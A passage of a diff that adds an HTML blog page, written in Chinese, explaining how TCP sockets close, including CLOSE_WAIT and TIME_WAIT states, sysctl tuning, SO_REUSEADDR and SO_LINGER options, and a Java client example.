+        <span class="p">{</span>
+            <span class="nx">printf</span><span class="p">(</span><span class="s2">&quot;对方socket已经退出,Ret【%d】!\n&quot;</span><span class="p">,</span><span class="nx">Ret</span><span class="p">);</span>
+            <span class="nx">Ret</span> <span class="o">=</span> <span class="nx">SOCKET_READE_ERROR</span><span class="p">;</span><span class="c1">//接收服务器端信息失败</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+<span class="nx">clear</span><span class="o">:</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">getBuffer</span> <span class="o">!=</span> <span class="nx">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">free</span><span class="p">(</span><span class="nx">getBuffer</span><span class="p">);</span>
+        <span class="nx">getBuffer</span> <span class="o">=</span> <span class="nx">NULL</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nx">closesocket</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
+</pre></div>
+</code></pre>
+<p>代码片段1.3</p>
+<p>这里摘录了服务器端部分代码，注意这个recv函数，这个函数在连接建立时，会堵塞住当前代码，等有数据接收成功后才返回，返回值为接收到的字节数；但是对于连接对方socket关闭情况，它能立即感应到，并且返回0.所以对于返回0的时候，可以跳出循环，结束当前socket处理，进行一些垃圾回收工作，注意最后一句closesocket操作是很重要的，假设没有写这句话，服务器端会一直处于CLOSE_WAIT状态。如果写了这句话，那么socket的流程就会是这样的：
+<img src="close2.png" alt="socket的关闭流程2"></p>
+<p>图1.2 <code>TIME_WAIT</code>出现流程</p>
+<h2><a name="time-wait" class="anchor" href="#time-wait"><span class="header-link"></span></a>TIME_WAIT分析</h2>
+<p>服务器端调用了CloseSocket操作后，会发送一个FIN信号给客户端，客户端进入<code>TIME_WAIT</code>状态，而且将维持在这个状态一段时间，这个时间也被成为2MSL(MSL是maximum segment lifetime的缩写，意指最大分节生命周期，这是IP数据包能在互联网上生存的最长时间，超过这个时间将在互联网上消失)，在这个时间段内如果客户端的发出的数据还没有被服务器端确认接收的话，可以趁这个时间等待服务端的确认消息。注意，客户端最后发出的ACK N+1消息，是一进入<code>TIME_WAIT</code>状态后就发出的，并不是在<code>TIME_WAIT</code>状态结束后发出的。如果在发送ACK N+1的时候，由于某种原因服务器端没有收到，那么服务器端会重新发送FIN N消息，这个时候如果客户端还处于<code>TIME_WAIT</code>状态的，会重新发送ACK N+1消息，否则客户端会直接发送一个RST消息，告诉服务器端socket连接已经不存在了。</p>
+<p>有时，我们在使用netstat命令查看web服务器端的tcp状态的时候，会发现有成千上万的连接句柄处在<code>TIME_WAIT</code>状态。web服务器的socket连接一般都是服务器端主动关闭的，当web服务器的并发访问量过大的时候，由于web服务器大多情况下是短连接，socket句柄的生命周期比较短，于是乎就出现了大量的句柄堵在<code>TIME_WAIT</code>状态，等待系统回收的情况。如果这种情况太过频繁，又由于操作系统本身的连接数就有限，势必会影响正常的socket连接的建立。在linux下对于这种情况倒是有解救措施，方法就是修改/etc/sysctl.conf文件，保证里面含有以下三行配置：</p>
+<pre><code><div class="highlight"><pre><span class="err">#表示开启重用。允许将</span><span class="nx">TIME</span><span class="o">-</span><span class="nx">WAIT</span> <span class="nx">sockets</span><span class="err">重新用于新的</span><span class="nx">TCP</span><span class="err">连接，默认为</span><span class="mi">0</span><span class="err">，表示关闭</span>  
+<span class="nx">net</span><span class="p">.</span><span class="nx">ipv4</span><span class="p">.</span><span class="nx">tcp_tw_reuse</span> <span class="o">=</span> <span class="mi">1</span>  
+<span class="err">#表示开启</span><span class="nx">TCP</span><span class="err">连接中</span><span class="nx">TIME</span><span class="o">-</span><span class="nx">WAIT</span> <span class="nx">sockets</span><span class="err">的快速回收，默认为</span><span class="mi">0</span><span class="err">，表示关闭</span>  
+<span class="nx">net</span><span class="p">.</span><span class="nx">ipv4</span><span class="p">.</span><span class="nx">tcp_tw_recycle</span> <span class="o">=</span> <span class="mi">1</span>  
+<span class="err">#表示系统同时保持</span><span class="nx">TIME_WAIT</span><span class="err">的最大数量，如果超过这个数字，</span>
+<span class="err">#</span><span class="nx">TIME_WAIT</span><span class="err">将立刻被清除并打印警告信息。默认为</span><span class="mi">180000</span><span class="err">，改为</span><span class="mi">5000</span><span class="err">。</span>
+<span class="nx">net</span><span class="p">.</span><span class="nx">ipv4</span><span class="p">.</span><span class="nx">tcp_max_tw_buckets</span> <span class="o">=</span> <span class="mi">5000</span>
+</pre></div>
+</code></pre>
+<p>配置型 2.1</p>
+<p>关于重用<code>TIME_WAIT</code>状态的句柄的操作，也可以在代码中设置：</p>
+<pre><code><div class="highlight"><pre><span class="kr">int</span> <span class="nx">on</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="nx">setsockopt</span><span class="p">(</span><span class="nx">socketfd</span><span class="cm">/*socket句柄*/</span><span class="p">,</span><span class="nx">SOL_SOCKET</span><span class="p">,</span><span class="nx">SO_REUSEADDR</span><span class="p">,(</span><span class="kr">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">on</span><span class="p">,</span><span class="nx">sizeof</span><span class="p">(</span><span class="nx">on</span><span class="p">)))</span>
+<span class="p">{</span>
+    <span class="k">return</span> <span class="nx">ERROR_SET_REUSE_ADDR</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+</code></pre>
+<p>代码片段2.1</p>
+<p>如果在代码中设置了关于重用的操作，程序中将使用代码中设置的选项决定重用或者不重用，/etc/sysctl.conf中<code>net.ipv4.tcp_tw_reuse</code>中的设置将不再其作用。</p>
+<p>当然这样设置是有悖TCP的设计标准的，因为处于<code>TIME_WAIT</code>状态的TCP连接，是有其存在的积极作用的，前面已经介绍过。假设客户端的ACK N+1信号发送失败，服务器端在1MSL时间过后会重发FIN N信号，而此时客户端重用了之前关闭的连接句柄建立了新的连接，但是此时就会收到一个FIN信号，导致自己被莫名其妙关闭。</p>
+<p>一般<code>TIME_WAIT</code>会维持在2MSL（linux下1MSL默认为30秒）时间，但是这个时间可以通过代码修改：</p>
+<pre><code><div class="highlight"><pre><span class="nx">struct</span> <span class="nx">linger</span> <span class="nx">so_linger</span><span class="p">;</span>
+<span class="nx">so_linger</span><span class="p">.</span><span class="nx">l_onoff</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="nx">so_linger</span><span class="p">.</span><span class="nx">l_linger</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="nx">setsockopt</span><span class="p">(</span><span class="nx">socketfd</span><span class="p">,</span><span class="nx">SOL_SOCKET</span><span class="p">,</span><span class="nx">SO_LINGER</span><span class="p">,(</span><span class="kr">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="nx">so_linger</span><span class="p">,</span><span class="nx">sizeof</span><span class="p">(</span><span class="nx">struct</span> <span class="nx">linger</span><span class="p">)))</span>
+<span class="p">{</span>
+    <span class="k">return</span> <span class="nx">ERROR_SET_LINGER</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+</code></pre>
+<p>代码片段2.2</p>
+<p>这里代码将<code>TIME_WAIT</code>的时间设置为10秒（在BSD系统中，将会是0.01*10s）。TCP中的<code>TIME_WAIT</code>机制使得socket程序可以“优雅”的关闭，如果你想你的程序更优雅，最好不要设置<code>TIME_WAIT</code>的停留时间，让老的tcp数据包在合理的时间内自生自灭。当然对于<code>SO_LINGER</code>参数，它不仅仅能够自定义<code>TIME_WAIT</code>状态的时间，还能够将TCP的四次挥手直接禁用掉，假设对于so_linger结构体变量的设置是这个样子的：</p>
+<pre><code><div class="highlight"><pre><span class="nx">so_linger</span><span class="p">.</span><span class="nx">l_onoff</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="nx">so_linger</span><span class="p">.</span><span class="nx">l_linger</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</pre></div>
+</code></pre>
+<p>如果客户端的socket是这么设置的那么socket的关闭流程就直接是这个样子了：
+<img src="close3.png" alt="socket的关闭流程3"></p>
+<p>图2.1 RST关闭流程</p>
+<p>这相当于客户端直接告诉服务器端，我这边异常终止了，对于我稍后给出的所有数据包你都可以丢弃掉。服务器端如果接受到这种RST消息，会直接把对应的socket句柄回收掉。有一些socket程序不想让TCP出现<code>TIME_WAIT</code>状态，会选择直接使用RST方式关闭socket，以保证socket句柄在最短的时间内得到回收，当然前提是接受有可能被丢弃老的数据包这种情况的出现。如果socket通信的前后数据包的关联性不是很强的话，换句话说每次通信都是一个单独的事务，那么可以考虑直接发送RST信号来快速关闭连接。</p>
+<h2><a name="" class="anchor" href="#"><span class="header-link"></span></a>补充</h2>
+<p>1.文中提到的修改/etc/sysctl.conf文件的情况，修改完成之后需要运行<code>/sbin/sysctl -p</code>后才能生效。
+2.图1中发送完FIN M信号后，被动关闭端的socket程序中输入流会接收到一个EOF标示，是在C代码中处理时recv函数返回0代表对方关闭，在java代码中会在InputStream的read函数中接收到-1：</p>
+<pre><code><div class="highlight"><pre><span class="nx">Socket</span> <span class="nx">client</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Socket</span><span class="p">();</span><span class="c1">//,9090</span>
+    <span class="k">try</span> <span class="p">{</span>
+        <span class="nx">client</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span>
+            <span class="k">new</span> <span class="nx">InetSocketAddress</span><span class="p">(</span><span class="s2">&quot;192.168.56.101&quot;</span><span class="p">,</span><span class="mi">9090</span><span class="p">));</span>
+
+        <span class="k">while</span><span class="p">(</span><span class="kc">true</span><span class="p">){</span>                
+            <span class="kr">int</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">client</span><span class="p">.</span><span class="nx">getInputStream</span><span class="p">().</span><span class="nx">read</span><span class="p">();</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">c</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">System</span><span class="p">.</span><span class="nx">out</span><span class="p">.</span><span class="nx">print</span><span class="p">((</span><span class="kr">char</span><span class="p">)</span> <span class="nx">c</span><span class="p">);</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="c1">//如果对方socket关闭，read函数返回-1</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+
+            <span class="k">try</span> <span class="p">{</span>
+                <span class="nx">Thread</span><span class="p">.</span><span class="nx">currentThread</span><span class="p">().</span><span class="nx">sleep</span><span class="p">(</span><span class="mi">2000</span><span class="p">);</span>                    
+            <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">InterruptedException</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">e</span><span class="p">.</span><span class="nx">printStackTrace</span><span class="p">();</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">IOException</span> <span class="nx">e2</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">e2</span><span class="p">.</span><span class="nx">printStackTrace</span><span class="p">();</span>
+    <span class="p">}</span> <span class="k">finally</span> <span class="p">{</span>
+        <span class="k">try</span> <span class="p">{</span>
+            <span class="nx">client</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
+        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">IOException</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">e</span><span class="p">.</span><span class="nx">printStackTrace</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+</pre></div>
+</code></pre>
+<p>代码片段3.1</p>
+<p>3.如果主动关闭方已经发起了关闭的FIN信号，被动关闭方不予理睬，依然往主动关闭方发送数据，那么主动关闭方会直接返回RST新号，连接双方的句柄就被双方的操作系统回收，如果此时双方的路由节点之前还存在未到达的数据，将会被丢弃掉。</p>
+<p>4.通信的过程中，socket双发中有一方的进程意外退出，则这一方将向其对应的另一方发送RST消息，所有双发建立的连接将会被回收，未接收完的消息就会被丢弃。</p>
+</div>
+
+  <div class="comments">
+    <a href="/posts/socket/#comments">
+      <span class="icon-bubbles"></span>
+      Comments
+    </a>
+  </div>
+
+
+<div class="pagination group">
+  
+    
+    
+  
+</div>
+    </div>
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.1/jquery.min.js" type="text/javascript"></script>
+    <script src="/scripts/main.js" type="text/javascript"></script>
+    <script>
+      // Add your analytics code here
+    </script>
+  </body>
+</html>
+
